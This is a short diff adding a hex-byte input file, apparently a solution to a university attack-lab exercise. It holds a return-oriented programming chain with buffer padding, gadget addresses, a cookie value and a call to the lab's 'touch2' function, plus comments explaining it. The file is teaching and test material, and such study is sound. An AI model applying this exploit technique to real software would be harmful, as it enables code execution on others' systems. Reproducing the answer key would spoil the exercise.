@@ -1,0 +1,7 @@
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 # buffer
+a4 28 40 00 00 00 00 00 # start point for chain of instructions for pop from stack to eax
+44 f0 31 32 00 00 00 00 # value of cookie I want to pop from stack
+ba 28 40 00 00 00 00 00 # start point for chain of instructions for mov from eax to rdi (function argument)
+ca 26 40 00 00 00 00 00 # call touch2
+
+# point was to chain functions, that already existed, so it would do desired code execution
